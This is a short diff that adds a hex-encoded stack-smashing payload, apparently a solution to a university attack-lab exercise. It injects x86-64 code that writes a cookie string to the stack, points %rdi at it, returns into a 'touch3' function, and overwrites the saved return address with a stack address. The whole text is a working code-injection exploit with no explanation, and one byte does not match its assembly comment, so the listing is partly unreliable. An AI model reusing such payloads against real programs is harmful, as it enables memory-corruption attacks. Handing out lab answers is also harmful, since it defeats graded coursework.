@@ -1,0 +1,10 @@
+
+6a 00                      /* push   $0x0 */
+48 83 ec 88                /* sub    $0x8,%rsp */
+48 c7 04 24 35 39 62 39    /* movq   $0x39623935,(%rsp)     */
+48 c7 44 24 04 39 37 66 61 /* movq   $0x61663739,0x4(%rsp) */
+48 89 e7                   /* mov %rsp %rdi */
+68 fa 18 40 00             /* push return address = touch3 */
+c3                         /* ret */
+90 90 90 90 90 90 90 90 
+78 dc 61 55 00 00 00 00    /* rsp 0x28, set to rsp + 0x18*/
